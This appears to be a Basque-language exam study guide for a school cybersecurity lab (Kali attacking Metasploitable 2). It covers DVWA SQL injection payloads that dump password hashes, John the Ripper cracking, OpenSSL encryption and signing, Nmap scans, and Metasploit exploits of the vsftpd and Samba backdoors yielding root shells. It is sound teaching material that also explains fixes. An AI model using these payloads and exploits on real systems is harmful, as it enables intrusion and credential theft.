# Azterketa Praktikoa: Gida Osoa, Ariketak eta Azalpen Teknikoak

**Modulua:** Zibersegurtasuna (1. Ebaluaketa) — 2MG3 Zibersegurtasuna  
**Ikastetxea:** Goierri Eskola  
**Ingurunea:** Kali Linux (Erasotzailea) eta Metasploitable 2 (Biktima / Zerbitzaria)  
**Helburua:** Azterketa praktikoan eskatuko diren ariketa gidatuen funtzionamendua, komandoak eta batez ere **zergati kontzeptualak** menderatzea.

---

> [!IMPORTANT]
> **Irakaslearen Ohar Nagusia Azterketarako:**  
> *"Ariketa gidatuak dira, baina egiten duzuenaren argibideak eskatuko dizkizuet (zer egiten ari zareten ongi ulertu behar duzue). Klasean egindako Sql injection, HASH, enkriptazio simetrikoa, asimetrikoa... Esan bezala, kodea ez da arazoa izango, baina zer egiten ari zareten ongi ulertu behar duzue."*

Dokumentu honek zati bakoitzean **zer komando exekutatu**, **zer emaitza ematen duen** eta **zergatik gertatzen den (azalpen tekniko teorikoa)** zehazten ditu, azterketan irakasleak edozein galdera eginda ere segurtasunez eta kalifikazio altuarekin erantzuteko.

---

## AURKIBIDEA
1. [1. ARIKETA: SQL Injekzioa (DVWA / Metasploitable)](#1-ariketa-sql-injekzioa-dvwa--metasploitable)
2. [2. ARIKETA: HASH Funtzioak, Elur-Jausi Efektua eta Pasahitzen Haustura](#2-ariketa-hash-funtzioak-elur-jausi-efektua-eta-pasahitzen-haustura)
3. [3. ARIKETA: Enkriptazio Simetrikoa (OpenSSL eta AES-256)](#3-ariketa-enkriptazio-simetrikoa-openssl-eta-aes-256)
4. [4. ARIKETA: Enkriptazio Asimetrikoa eta Sinadura Digitala (RSA eta GPG)](#4-ariketa-enkriptazio-asimetrikoa-eta-sinadura-digitala-rsa-eta-gpg)
5. [5. ARIKETA: Nmap Sare-Eskaneoa eta Ahultasunen Detekzioa (1-10 Laborategi Ariketak)](#5-ariketa-nmap-sare-eskaneoa-eta-ahultasunen-detekzioa-1-10-laborategi-ariketak)
6. [6. ARIKETA: Metasploit, Atzeko Ateak eta Saio Alderantzikatua](#6-ariketa-metasploit-atzeko-ateak-eta-saio-alderantzikatua)
7. [AZTERKETAKO "ZER ARI ZARA EGITEN?" GALDEREI ERANTZUTEKO TXU-TXELA](#azterketako-zer-ari-zara-egiten-galderei-erantzuteko-txu-txela)

---

## 1. ARIKETA: SQL Injekzioa (DVWA / Metasploitable)

### 1.1. Helburua eta Eszenatokia
Web aplikazio ahul baten sarrera-eremuan (`User ID`) datu-basearen logika aldatzea, baimenik gabeko datuak (erabiltzaile guztien erregistroak eta pasahitzen hash-ak) erauztea eta ahultasuna zergatik gertatzen den eta nola konpontzen den azaltzea.

* **Biktimaren IPa:** `192.168.56.104` (Metasploitable)
* **Aplikazioa:** DVWA (*Damn Vulnerable Web Application*), Segurtasun maila: **Low**.
* **URL ahula:** `http://192.168.56.104/dvwa/vulnerabilities/sqli/`

---

### 1.2. Urrats Praktikoak eta Payload-ak

#### 1. Urratsa: Oinarrizko Injekzioa (Bypass / Erregistro Guztiak Bistaratu)
Sartu `User ID` laukitxoan payload hau:
```text
' OR '1'='1
```
Edo formularioak komatxoa ixtean arazorik ez emateko iruzkinarekin:
```text
' OR '1'='1'#
```

* **Terminaleko / Nabigatzaileko Emaitza:**  
  Bakar baten ordez, datu-baseko erabiltzaile guztiak agertzen dira pantailan (`admin`, `Gordon Brown`, `Hack Me`, `Pablo Picasso`, `Bob Smith`).

#### 2. Urratsa: Bertsioa eta Datu-baseko Erabiltzailea Ezagutzea (`UNION SELECT`)
```text
1' UNION SELECT user(), version()#
```
* **Emaitza:** MySQL bertsioa eta konektatutako datu-baseko erabiltzailea erakusten ditu (adib. `root@localhost`).

#### 3. Urratsa: Taulak Aurkitzea (`information_schema`)
```text
1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database()#
```
* **Emaitza:** Datu-baseko taulak zerrendatzen dira (adib. `users`, `guestbook`).

#### 4. Urratsa: Erabiltzaileen Pasahitz Hash-ak Erauztea
```text
1' UNION SELECT user, password FROM users#
```
* **Emaitza:** Erabiltzaile bakoitzaren izena eta bere MD5 hash-a agertzen dira:
  - `admin` -> `5f4dcc3b5aa765d61d8327deb882cf99`

#### 5. Urratsa: Hash-a Deszifratzea / Haustea
Lortutako hash-a CrackStation webgunean edo Kali Linuxeko John the Ripper bidez aztertzen da:
- Hash: `5f4dcc3b5aa765d61d8327deb882cf99`
- Pasahitza: `password` (MD5 algoritmo zaharkitua, gatzik gabekoa).

---

### 1.3. Azalpen Teknikoa: Zergatik gertatzen da? (Irakasleari azaltzeko)

#### A) Zerbitzariaren Kode Ahula (PHP):
```php
$id = $_GET['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
$result = mysqli_query($db, $query);
```
**Zergatia:** Zerbitzariak erabiltzailearen sarrera **zuzenean kateatzen du (string concatenation)** SQL kontsultaren testu-katean, inolako garbiketa, iragazki edo mota-egiaztapenik egin gabe.

#### B) Payload-aren Mekanika Matematikoa:
Garatzaileak pentsatutako kontsulta:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1';
```
Guk `' OR '1'='1` sartzean, MySQL-k interpretatzen duena:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '' OR '1'='1';
```
1. **Komatxo bakunak (`'`)**: Garatzaileak irekitako testu-katea itxi egiten du aurretik.
2. **`OR` operadore logikoa**: Bigarren baldintza bat gehitzen dio bilaketari.
3. **`'1'='1'`**: Egia unibertsala (**tautologia**) da. Beti betetzen da (`TRUE`).
4. **Ondorioa:** `WHERE FALSE OR TRUE` $\rightarrow$ `TRUE`. Taulako errenkada guzti-guztientzat baldintza betetzen denez, datu-baseak taula osoa erauzita bidaltzen dio erasotzaileari.

---

### 1.4. Konponbide Zuzena: Kode Segurua (Prepared Statements)
Zergatik ez da nahikoa komatxoak kentzea? Erasotzaileak beste bide batzuk aurki ditzakeelako. Soluzio estandarra eta segurua **Kontsulta Prestatuak (Prepared Statements)** erabiltzea da (PDO edo MySQLi parametrizatua).

```php
// 1. Sarreraren mota balidatu (zenbakia dela ziurtatu)
if (!ctype_digit($_GET['id'])) {
    die("Errorea: Zenbaki baliozkoa behar da.");
}

// 2. Kontsulta prestatua definitu (:id parametro markatzaile hutsa da)
$stmt = $pdo->prepare('SELECT first_name, last_name FROM users WHERE user_id = :id');

// 3. Datuak bereizita lotu (Datu eta Kode banaketa)
$stmt->bindParam(':id', $_GET['id'], PDO::PARAM_INT);
$stmt->execute();
```

> **Argudio Klabia:** Kontsulta prestatuekin, SQL motorrak lehenik kontsultaren egitura logikoa konpilatzen du. Ondoren jasotzen duen sarrera **datu literal huts bezala** hartzen du; erabiltzaileak `' OR '1'='1` sartzen badu ere, ez du sekula SQL kode gisa interpretatuko, testu gisa baizik.

---

## 2. ARIKETA: HASH Funtzioak, Elur-Jausi Efektua eta Pasahitzen Haustura

### 2.1. Helburua
Hash kriptografikoen propietateak ulertzea (aldebakarrekoa izatea, tamaina finkoa, elur-jausi efektua), fitxategien osotasuna egiaztatzea eta pasahitz ahulak hiztegi-erasoen bidez haustea.

---

### 2.2. Urrats Praktikoak eta Komandoak

#### 1. Hash-ak kalkulatzea eta Luzera Egiaztatzea
```bash
echo -n "Kriptografia" | md5sum
echo -n "Kriptografia" | sha1sum
echo -n "Kriptografia" | sha256sum
```
* **Irteerak eta Luzerak:**
  - **MD5:** `9b441f7e340a6bbbf1ff2ec070529949` $\rightarrow$ 32 karaktere hexadezimal = **128 bit** ($32 \times 4$).
  - **SHA-1:** `5c0ff8be80be96ff172081d48c08fc46bba522ea` $\rightarrow$ 40 karaktere hexadezimal = **160 bit**.
  - **SHA-256:** `d2ea1610e6a8...` $\rightarrow$ 64 karaktere hexadezimal = **256 bit**.

#### 2. Elur-Jausi Efektua (*Avalanche Effect*) Egiaztatzea
Aldatu letra bakar bat (adibidez 'K' larria 'k' xehe bihurtu):
```bash
echo -n "kriptografia" | sha256sum
```
* **Emaitza:** `b9d16a570059c1b3f9478f7734a6bcfae1a02958742ca1763a826359fec38e55`
* **Azalpena:** Sarreran bit bakar bat aldatuta ere, 256 bitetatik erdiak (%50 inguru) aldatu dira erabat ausazkoa balitz bezala. Ezin da irteeratik jatorrizko mezua antzeman.

#### 3. Fitxategi baten Osotasuna Egiaztatzea
```bash
# Fitxategia sortu eta hash-a gorde
echo "Sekretu handiko dokumentua" > dokumentua.txt
sha256sum dokumentua.txt > hash_baliozkoa.txt

# Fitxategia manipulatu (puntu bat gehitu)
echo "Sekretu handiko dokumentua." > dokumentua.txt

# Egiaztapena exekutatu
sha256sum -c hash_baliozkoa.txt
```
* **Irteera:** `dokumentua.txt: HUTS EGIN DU (FAILED) / Kontrol-baturak ez du bat egin`.
* **Esanahia:** Hash funtzioek bermatzen dute fitxategia ez dela aldatu edo hondatu bidean (**Integritatea**).

#### 4. Hiztegi-Erasoa John the Ripper-ekin
```bash
# Hash-ak fitxategian sartu
echo -n "123456" | md5sum | awk '{print $1}' > hashes.txt
echo -n "dragon2020" | md5sum | awk '{print $1}' >> hashes.txt

# Erasoa exekutatu rockyou hiztegiarekin
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Emaitzak bistaratu
john --show --format=raw-md5 hashes.txt
```
* **Emaitza:** `123456` berehala hausten da (milisegundotan); `dragon2020` segundo erdian.

---

### 2.3. Azalpen Teknikoa (Irakasleari azaltzeko)

#### A) Hash-aren 4 Ezaugarri Nagusiak:
1. **Determinsta:** Sarrera berak beti hash bera ematen du.
2. **Tamaina finkoa:** Sarrera letra bat edo 10 GB-ko fitxategia izan, SHA-256-k beti 256 bit sortzen ditu.
3. **Aldebakarrekoa (One-way / Aurreirudiaren aurkako erresistentzia):** Ez dago gakorik, ezin da "deszifratu". Datu bat identifikatzeko balio du.
4. **Talken aurkako erresistentzia (*Collision resistance*):** Ezinezkoa izan behar du hash bera duten bi mezu ezberdin aurkitzea. (MD5 eta SHA-1 hautsita daude talkak aurkitu direlako!).

#### B) Zergatik ezin da pasahitz bat SHA-256 hutsarekin gorde?
* **Hash azkarrak vs KDF motelak:** SHA-256 oso azkarra izateko diseinatuta dago (deskargak egiaztatzeko ezin hobea). Baina horregatik, GPU moderno batek segundo bakoitzean milaka milioi SHA-256 kalkula ditzake, pasahitzak indar gordin bidez berehala hautsiz.
* **Soluzioa:** KDF motelak erabiltzea (**Argon2id**, **bcrypt**, **scrypt**, **PBKDF2**), iterazio eta memoria kontsumo erregulagarriekin.
* **Gatza (*Salt*):** Erabiltzaile bakoitzeko balio aleatorio publikoa. Helburua: Ortzadar-taulak (*Rainbow tables*) ezerezean uztea eta pasahitz bera duten bi erabiltzaileri hash ezberdina ematea.
* **Pimienta (*Pepper*):** Aplikazio mailako gako sekretua (HSM edo konfigurazioan gordea), datu-basea lapurtzen bada pasahitzen probak hastea eragozten duena.

---

## 3. ARIKETA: Enkriptazio Simetrikoa (OpenSSL eta AES-256)

### 3.1. Helburua
Gako sekretu berdinarekin datuak zifratzea eta deszifratzea, zifratze-blokeen funtzionamendua ulertzea eta gako okerrarekin zer gertatzen den aztertzea.

---

### 3.2. Urrats Praktikoak eta Komandoak

#### 1. Fitxategia Zifratzea AES-256-CBC bidez
```bash
echo "Hau informazio oso konfidentziala da." > fitxategia.txt

# Zifratu AES-256-CBC bidez (-pbkdf2 eta -salt gomendatuak dira segurtasunerako)
openssl enc -aes-256-cbc -pbkdf2 -salt -in fitxategia.txt -out zifratua.enc
# Pasahitza eskatuko du: sartu adibidez 'Goierri2026'
```

#### 2. Testu Zifratua Ikuskatzea
```bash
xxd zifratua.enc | head -n 3
```
* **Irteera:** Byte ulertezinak ikusten dira. Hasieran `Salted__` agertzen da, gatz aleatorioa automatikoki gehitu duelako.

#### 3. Deszifratzea Gako Zuzenarekin
```bash
openssl enc -d -aes-256-cbc -pbkdf2 -in zifratua.enc -out deszifratua.txt -k "Goierri2026"
cat deszifratua.txt
```
* **Irteera:** Jatorrizko testua leheneratzen da: `Hau informazio oso konfidentziala da.`

#### 4. Deszifratzen Saiatzea Gako Okerrarekin
```bash
openssl enc -d -aes-256-cbc -pbkdf2 -in zifratua.enc -out huts.txt -k "OkerrekoPasahitza"
```
* **Irteera:**
  ```text
  bad decrypt
  error:...:bad decrypt:...:cipher_common_block.c
  ```

---

### 3.3. Azalpen Teknikoa (Irakasleari azaltzeko)

#### A) Zergatik ematen du `bad decrypt` errorea?
AES bloke-zifratze bat da (128 biteko blokeak). Mezuaren amaieran betetze-byteak (**PKCS#7 padding**) eransten dira bloke osoa osatzeko. Gako oker batekin deszifratzean, amaierako betetze-byteak ez datoz bat espero den arauarekin, eta OpenSSL-k berehala jakiten du gakoa ez dela zuzena.

#### B) Bloke Moduak: ECB vs CBC vs GCM
* **ECB (Electronic Codebook):** Bloke bakoitza independenteki zifratzen du, IV gabe. **INOIZ EZ ERABILI!** Testu arrunt berdinak beti zifratu bera ematen duenez, datuen egitura eta patroiak agerian uzten ditu (Tux pinguinoaren irudiaren adibidea).
* **CBC (Cipher Block Chaining):** Bloke bakoitza aurreko bloke zifratuarekin XOR egiten du. Ausazko IV (*Initialization Vector*) bat behar du. Patroiak ezkutatzen ditu, baina ez du osotasunik bermatzen eta ez da paralelizagarria.
* **GCM (Galois/Counter Mode):** Modu modernoa eta gomendatua (AEAD: *Authenticated Encryption with Associated Data*). Konfidentzialtasuna eta autentikotasuna/osotasuna aldi berean ematen ditu, eta oso azkarra da paralelizagarria delako. Nonce balioa ezin da sekula gako berarekin errepikatu. TLS 1.2 eta 1.3 estandarra da.

#### C) Zifratze Simetrikoaren Muga Nagusia:
* **Gakoaren Banaketaren Arazoa:** Mezuak zifratzeko eta deszifratzeko gako bera erabili behar denez, igorleak eta hartzaileak aldez aurretik gako hori partekatu behar dute bide seguru batetik.
* Bikoteka komunikatu nahi duten $n$ pertsonarentzat $\frac{n(n-1)}{2}$ gako behar dira (100 pertsonarentzat 4.950 gako!). Gainera, ez du **ukatzerik eza** (*No repudio*) bermatzen, bi aldeek gako bera dutenez biek sor baitezakete mezua.

---

## 4. ARIKETA: Enkriptazio Asimetrikoa eta Sinadura Digitala (RSA eta GPG)

### 4.1. Helburua
Matematikoki erlazionatutako gako-bikoteen funtzionamendua (publikoa eta pribatua) ulertzea, zifratze asimetrikoa eta sinadura digitala bereiztea, eta fitxategi manipulatuak detektatzea.

---

### 4.2. Urrats Praktikoak eta Komandoak

#### 1. 2048 biteko RSA Gako-Bikotea Sortzea eta Publikoa Erauztea
```bash
# Gako pribatua sortu (inoiz ez da partekatzen!)
openssl genpkey -algorithm RSA -out rsa_pribatua.pem -pkeyopt rsa_keygen_bits:2048

# Gako publikoa erauztea (edonori eman dakioke)
openssl rsa -pubout -in rsa_pribatua.pem -out rsa_publikoa.pem
```

#### 2. Konfidentzialtasuna: Gako Publikoarekin Zifratu, Pribatuarekin Deszifratu
```bash
echo "Mezu sekretu asimetrikoa" > mezua.txt

# Gako PUBLIKOAZ zifratu (Bob-en publikoa)
openssl pkeyutl -encrypt -pubin -inkey rsa_publikoa.pem -in mezua.txt -out mezua.enc

# Gako PRIBATUAZ deszifratu (Bob-ek bakarrik dezake)
openssl pkeyutl -decrypt -inkey rsa_pribatua.pem -in mezua.enc
```
* **Zer gertatzen da gako publikoarekin deszifratzen saiatuz gero?**
  ```bash
  openssl pkeyutl -decrypt -pubin -inkey rsa_publikoa.pem -in mezua.enc
  ```
  Sistemak errorea ematen du: `A private key is needed for this operation`. Zifratze asimetrikoa noranzko bakarreko tranpa-ate matematiko batean oinarritzen da!

#### 3. Sinadura Digitala: Sortzea eta Egiaztatzea
```bash
# 1. Sinatu beharreko agiria sortu
echo "Ordainketa: 1000 euro onartzen dira." > kontratua.txt

# 2. Sinadura digitala sortu (SHA-256 hash-a gako PRIBATUAZ sinatzen da)
openssl dgst -sha256 -sign rsa_pribatua.pem -out kontratua.sig kontratua.txt

# 3. Sinadura egiaztatu gako PUBLIKOAZ
openssl dgst -sha256 -verify rsa_publikoa.pem -signature kontratua.sig kontratua.txt
# Emaitza: Verified OK

# 4. Agiria manipulatu (1000 -> 9000)
sed -i 's/1000/9000/' kontratua.txt

# 5. Sinadura berriro egiaztatu
openssl dgst -sha256 -verify rsa_publikoa.pem -signature kontratua.sig kontratua.txt
# Emaitza: Verification failure
```

---

### 4.3. Azalpen Teknikoa (Irakasleari azaltzeko)

#### A) Zifratzea vs Sinatzea: Zein gako erabiltzen da?
| Helburua | Nork zifratzen / sinatzen du? | Zein gakorekin? | Nork deszifratzen / egiaztatzen du? | Zein gakorekin? |
| :--- | :--- | :--- | :--- | :--- |
| **Konfidentzialtasuna** | Igorleak | Hartzailearen **PUBLIKOAZ** | Hartzaileak | Bere **PRIBATUAZ** |
| **Sinadura Digitala** | Egileak | Bere **PRIBATUAZ** | Edonork | Egilearen **PUBLIKOAZ** |

#### B) Zer bermatzen du sinadura digital batek?
1. **Osotasuna (*Integrity*):** Agiria ez da aldatu sinatu zenetik (karaktere bat aldatuz gero `Verification failure` ematen du).
2. **Autentikotasuna (*Authenticity*):** Agiria dagokion gako pribatuaren jabeak sinatu duela frogatzen du.
3. **Ukatzerik eza (*Non-repudiation*):** Egileak ezin du ukatu berak sinatu duenik, gako pribatua berak bakarrik baitu.
4. **KONTUZ (Galdera Tranpa!):** Sinadura digitalak **EZ DU KONFIDENTZIALTASUNIK BERMATZEN**. Agiriaren testua agerian doa; sinadura hash-aren gainean egiten da, ez testua ezkutatzeko.

#### C) Zifratze Hibridoa (HTTPS / TLS 1.3): Zergatik konbinatzen dira biak?
* Asimetrikoa segurua da gakoak trukatzeko, baina simetrikoa baino **ehunka/milaka aldiz motelagoa** da.
* Simetrikoa oso azkarra da datu handiak zifratzeko, baina gakoa nola bidali arazoa du.
* **HTTPS-ren irtenbidea:**
  1. Kriptografia asimetrikoa erabiltzen da zerbitzaria autentifikatzeko (X.509 ziurtagiria) eta saio-gako iragankor bat adosteko (ECDHE).
  2. Saio-gako horrekin, konexioko datu guztiak zifratze simetriko azkarrez (AES-GCM edo ChaCha20-Poly1305) bidaltzen dira.

---

## 5. ARIKETA: Nmap Sare-Eskaneoa eta Ahultasunen Detekzioa (1-10 Laborategi Ariketak)

### 5.1. Helburua eta Eszenatokia
Klasean (`lab/NMAP_ariketak/` eta `Nmap_ariketak/`) egindako 10 ariketen bidez, sare lokaleko ostalariak aurkitzea, TCP/UDP portuak aztertzea, zerbitzu eta bertsio zehatzak ateratzea, sistema eragilea identifikatzea eta NSE (*Nmap Scripting Engine*) bidez zaurgarritasunak antzematea.

* **Makina Erasotzailea (Kali Linux):** `192.168.56.105`
* **Makina Biktima (Metasploitable 2):** `192.168.56.104`
* **Windows Host / Bideratzailea:** `192.168.56.1`

---

### 5.2. Nmap-en 10 Ariketa Gidatuak: Komandoak eta Emaitzak

#### 1. Ariketa: Host Aktiboen Aurkikuntza (Porturik eskaneatu gabe)
```bash
sudo nmap -sn 192.168.56.0/24
```
* **Aukera:** `-sn` (*Ping Scan* edo *No Port Scan*).
* **Azalpena:** Ez ditu portuak aztertzen; ICMP Echo, TCP SYN 443, TCP ACK 80 eta ARP eskaerak bidaltzen ditu sarean zein IP dauden piztuta jakiteko.
* **Emaitza:** 4 host aktibo aurkitu dira (`192.168.56.1`, `192.168.56.100`, `192.168.56.104` eta `192.168.56.105`).

#### 2. Ariketa: Oinarrizko TCP SYN Portu Eskaneoa
```bash
sudo nmap -sS 192.168.56.104
```
* **Aukera:** `-sS` (*TCP SYN Stealth Scan*).
* **Zergatik da Nmap-en lehenetsia?** Oso azkarra delako eta TCPren 3-way handshake-a **ez duelako osatzen**:
  1. Kali-k `SYN` bidaltzen du.
  2. Xedeak `SYN-ACK` erantzuten badu (portua irekita dago).
  3. Kali-k berehala `RST` (reset) bidaltzen du konexioa bertan behera uzteko, aplikazioaren log arruntetan erregistratu gabe geratuz.
* **Portuen 3 Egoerak:**
  * **`open`:** Zerbitzu bat entzuten ari da eta SYN-ACK bidali du.
  * **`closed`:** Ez dago zerbitzurik; sistemak RST paketez erantzun du.
  * **`filtered`:** Nmap-ek ezin du jakin irekita ala itxita dagoen, suebaki batek paketea bota edo blokeatu duelako erantzunik gabe (timeout).

#### 3. Ariketa: Portu Guztien Eskaneo Osoa (`-p-`)
```bash
nmap -p- -T4 -Pn -n 192.168.56.104 -oN escaneo1.txt
```
* **Aukerak:**
  * `-p-`: 65.535 portu guztiak aztertzen ditu (`1-65535`).
  * `-T4`: Denbora-txantiloia azkartu (*Aggressive timing*).
  * `-Pn`: Ez egin aurretiazko ping-ik (jo xedea aktibotzat).
  * `-n`: Ez egin DNS ebazpenik (azkarragoa).
* **Zergatik ez da egiten lehenetsiz?** Eraginkortasunagatik. Lehenetsitako 1.000 portuek trafiko arruntaren %98 estaltzen dute segundotan; 65.535 portuak aztertzeak askoz pakete gehiago eta minutu batzuk eskatzen ditu.
* **Aurkikuntza:** Lehenetsitakoan agertzen ez ziren **7 portu ezkutu** aurkitu dira: `3632/tcp` (distccd), `6697/tcp` (ircs-u), `8787/tcp` (msgsrvr), eta RPC dinamikoak (`39635`, `45924`, `59128`, `59131`).

#### 4. Ariketa: Zerbitzuen Bertsio Zehatzak Detektatzea (`-sV`)
```bash
nmap -sV -p 21,22,23,25,80,139,445,3306,3632,5432,6667,8180 192.168.56.104
```
* **Aukera:** `-sV` (*Service Version Detection*).
* **Softwareak eta Zaurgarritasun Larriak (CVE):**
  * `21/tcp`: `vsftpd 2.3.4` $\rightarrow$ **CVE-2011-2523** (Atzeko atea root shell irekiz).
  * `445/tcp`: `Samba smbd 3.0.20-Debian` $\rightarrow$ **CVE-2007-2447** (`username map script` RCE erasoa root gisa).
  * `3632/tcp`: `distccd v1` $\rightarrow$ **CVE-2004-2687** (Urruneko komandoak exekutatzea baimenik gabe).
  * `6667/tcp`: `UnrealIRCd` $\rightarrow$ **CVE-2010-2075** (Troiar atzeko atea).

#### 5. Ariketa: Sistema Eragilearen Detekzioa (`-O`)
```bash
sudo nmap -O 192.168.56.104
```
* **Aukera:** `-O` (*Operating System detection*).
* **Nola funtzionatzen du?** Nmap-ek TCP eta UDP pakete bereziak bidaltzen ditu eta erantzuneko TCP/IP aztarnak (TTL balioak, TCP leiho-tamainak, DF flag-ak) bere datu-baseko milaka sistemekin konparatzen ditu.
* **Emaitza:** `Linux 2.6.9 - 2.6.33` (%96-%100eko ziurtasuna).

#### 6. Ariketa: UDP Portuen Eskaneoa (`-sU`)
```bash
sudo nmap -sU --top-ports 20 192.168.56.104
```
* **Aukera:** `-sU` (*UDP Scan*).
* **Zergatik da UDP askoz motelagoa TCP baino?**
  1. UDP konexiorik gabeko protokoloa da (*connectionless*): portu irekiek ez dute ACK bidaltzen, beraz Nmap-ek timeout osoa itxaron behar du portua `open|filtered` dela erabakitzeko.
  2. Portu itxiek `ICMP Port Unreachable` mezua itzultzen dute, baina Linux kernelak segundoko erantzun bakarrera mugatzen ditu ICMP paketeak (**rate-limiting**). Horregatik, UDP eskaneo oso batek orduak har ditzake.
* **Aurkitutako UDP Zerbitzuak:** `53/udp` (DNS), `111/udp` (rpcbind), `137/udp` (NetBIOS), `2049/udp` (NFS).

#### 7. Ariketa: NSE Script-ak: Ahultasunen Bilaketa Automatikoa (`--script=vuln`)
```bash
nmap -p 21,25,80,139,445,3632,6667 --script=vuln 192.168.56.104
```
* **Aukera:** `--script=vuln` (Zaurgarritasun ezagunak egiaztatzeko Lua script-ak).
* **Abantaila:** Bertsio hutsa irakurri ordez, froga ez-suntsitzaileak bidaltzen ditu eta zaurgarritasuna egiazki ustiagarria den baieztatzen du (CVE zenbakiekin).

#### 8. Ariketa: NSE SMB Enumerazio Bideratua
```bash
nmap -p 139,445 --script=smb-os-discovery,smb-enum-shares 192.168.56.104
```
* **Aukera:** Script anitzak komaz banatuta (espaziorik gabe).
* **Emaitza:**
  * `smb-os-discovery`: Ordenagailuaren izena (`metasploitable`), domeinua (`localdomain`), sistema eragilea (`Unix - Samba 3.0.20-Debian`).
  * `smb-enum-shares`: Karpeta partekatuetan `tmp` eta `IPC$` baliabideek **sarbide anonimo osoa (READ/WRITE)** dutela erakusten du pasahitzik gabe.

#### 9. Ariketa: NSE FTP Anonimoa eta Backdoor Egiaztapena
```bash
nmap -p 21 --script=ftp-anon,ftp-vsftpd-backdoor 192.168.56.104
```
* **Emaitza:**
  * `ftp-anon`: `Anonymous FTP login allowed (FTP code 230)`.
  * `ftp-vsftpd-backdoor`: `State: VULNERABLE (Exploitable) - CVE-2011-2523`.

#### 10. Ariketa: Emaitzen Esportazioa Formatutan (`-oA`)
```bash
nmap -sV -sC -p- 192.168.56.104 -oA txostena_nmap
```
* **Aukerak:**
  * `-oN`: Normal (testu arruntean, gizakiak irakurtzeko).
  * `-oX`: XML (tresna automatizatuek inportatzeko).
  * `-oG`: Grepable (lerro bakarreko formatua, `grep` bidez iragazteko).
  * `-oA`: Hiru formatuak batera sortzen ditu (`.nmap`, `.xml`, `.gnmap`).

---

## 6. ARIKETA: Metasploit, Atzeko Ateak eta Saio Alderantzikatua

### 5.1. Helburua
Metasploitable makinaren zaurgarritasunak identifikatzea eta esplotatzea Kali Linuxetik, saio interaktiboa lortuz eta baimenak kudeatuz.

---

### 5.2. Ariketa Praktikoak

#### 1. VSFTPD 2.3.4 Backdoor Esplotazioa
```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set rhost 192.168.56.104
set rport 21
set lhost 192.168.56.105
run
```
* **Azalpena:** VSFTPD 2.3.4 bertsioan garatzaileen iturburu-kodean atzeko ate bat (*backdoor*) sartu zen: erabiltzaile-izenean `:)` irribarrea sartzean, 6200 portuan root baimenak dituen shell bat irekitzen da.

#### 2. Samba Zerbitzuaren Analisia (Portua 445 - CVE-2007-2447)
```bash
# Eskaneatu zerbitzua
nmap -p 445 -sV 192.168.56.104
# Esplotazioa (username map script)
use exploit/multi/samba/usermap_script
set rhost 192.168.56.104
run
```
* **Azalpena:** `username map script` aukerak erabiltzaile izenean shell komandoak txertatzea (`nohup` bidez) baimentzen zuen, urruneko kodea root baimenez exekutatuz.

#### 3. Post-Esplotazioko Komando Garrantzitsuak
* **Erabiltzailea jakiteko:** Meterpreter-en `getuid` erabili behar da (`whoami` komandoak errore ematen du Meterpreter-en). Edo `shell` aginduarekin Linux terminalera pasa eta bertan `whoami` idatzi.
* **Makina biktima itzaltzeko:** Linux shellean sartu eta `shutdown -h now` exekutatu (`-h` = halt, energia moztu; `now` = berehala).

---

## AZTERKETAKO "ZER ARI ZARA EGITEN?" GALDEREI ERANTZUTEKO TXU-TXELA

Irakasleak azterketa praktikoan pantailari begiratu eta galdera hauek egin diezazkizuke:

| Irakaslearen Galdera | Zure Erantzun Tekniko Zuzena |
| :--- | :--- |
| **"Zergatik jarri duzu `' OR '1'='1` User ID eremuan?"** | *"Komatxo bakunak zerbitzariko PHP kodeak irekitako katea ixten du. Ondoren, `OR` bidez `1=1` tautologia gehitzen dugu. Baldintza hori beti `TRUE` denez, `WHERE` klausulak taulako erregistro guztiak bueltatzen ditu."* |
| **"Nola konponduko zenuke SQL injekzio hori kodean?"** | *"Prepared Statements (Kontsulta Prestatuak) erabiliz (PDO edo MySQLi bidez). Kontsultaren egitura aldez aurretik konpilatzen da eta erabiltzailearen sarrera parametro literal huts gisa bidaltzen da, sekula ez kode gisa exekutatuz."* |
| **"Fitxategi baten hitz bat aldatu dut eta hash osoa aldatu da. Zergatik?"** | *"Elur-jausi efektuagatik (Avalanche effect). Hash kriptografiko on batean sarrerako bit bakar bat aldatzeak irteerako biten %50 inguru aldatzea dakar, irteeratik jatorrizko mezua ezin aurreikusteko."* |
| **"Gako okerrarekin saiatu naiz deszifratzen eta `bad decrypt` eman du. Zer esan nahi du?"** | *"Bloke-zifratzeek (AES-CBC) amaieran PKCS#7 padding-a (betegarria) erabiltzen dute. Gako okerrarekin deszifratzean blokearen amaierako padding-a ez dator bat arau matematikoarekin eta OpenSSL-k badaki deszifraketak huts egin duela."* |
| **"Sinadura digitalak fitxategia zifratzen du?"** | *"EZ. Sinadura digitalak ez du fitxategia ezkutatzen edo zifratzen (ez du konfidentzialtasunik ematen). Sinadurak fitxategiaren HASH-a zifratzen du gako pribatuarekin, Osotasuna, Autentikotasuna eta Ukatzerik eza bermatzeko."* |
| **"Zergatik ez dugu erabiltzen RSA fitxategi handiak zifratzeko?"** | *"Kriptografia asimetrikoa simetrikoa baino ehunka edo milaka aldiz motelagoa delako kalkulu matematiko konplexuengatik. Horregatik erabiltzen da Zifratze Hibridoa: asimetrikoa gakoa trukatzeko, eta simetrikoa (AES) datuak zifratzeko."* |
| **"Zertarako balio du gatzak (Salt) pasahitzetan?"** | *"Erabiltzaile bakoitzari balio aleatorio ezberdin bat eransten zaio. Horrela, bi erabiltzailek pasahitz bera badute ere hash ezberdina izango dute, eta erasotzaileen Ortzadar-taulak (Rainbow tables) alferrikako bihurtzen dira."* |
| **"Zergatik erabili duzu `-sS` eta ez `-sT` Nmap-en?"** | *"SYN eskaneoak ez duelako TCP 3-way handshake-a osatzen (erdizka uzten du RST bidaliz). Horri esker askoz azkarragoa da eta aplikazioen ohiko logetan ez du konexio arrunt gisa arrastorik uzten (stealth)."* |
| **"Zer desberdintasun dago portu bat 'open', 'closed' edo 'filtered' egotearen artean?"** | *"'Open': zerbitzu bat entzuten ari da eta SYN-ACK erantzun du. 'Closed': ez dago zerbitzurik eta sistemak RST bidali du. 'Filtered': suebaki batek paketea blokeatu du eta Nmap-ek ez du erantzunik jaso (timeout)."* |
